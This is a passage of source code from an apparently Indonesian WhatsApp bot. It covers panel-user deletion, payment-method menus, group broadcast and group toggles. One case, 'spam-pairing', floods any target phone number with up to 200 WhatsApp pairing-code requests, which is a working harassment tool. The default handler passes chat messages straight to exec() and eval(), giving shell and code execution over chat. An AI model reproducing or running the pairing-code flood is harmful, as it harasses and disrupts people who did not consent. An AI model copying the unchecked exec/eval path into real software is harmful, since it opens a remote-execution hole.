let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
case "payment": {
if (!isOwner) return KleeReply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".danapay" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovopay" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS Payment", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await Klee.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
break
case "danapay": {
if (global.dana == false) return m.reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
Klee.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
Klee.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return m.reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
Klee.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (global.qris == false) return m.reply('Payment Qris Tidak Tersedia')
m.reply('Memproses Mengambil QRIS, Tunggu Sebentar . . .')
let teks = `
*NIH KAK QRIS ALPAYMENT KU⬆️*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
Klee.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break

case 'bcgc': case 'bcgroup': {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await vallzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
Klee.sendMessage(i, {text: `${text}`}, {quoted:qchanel})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

     case 'delgc':
if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return m.reply("Khusus Grup")
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Not Active ✅`)
break
case 'addgc':
if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return m.reply("Khusus Grup")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Active To Crate Subdo ✅`)
break
case 'spam-pairing': {
if (!isOwner) return m.reply(mess.OnlyOwner)
if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
// CASE SELESAI SAMPAI SINI
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Klee.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Klee.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Klee.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Klee.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
//Klee.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})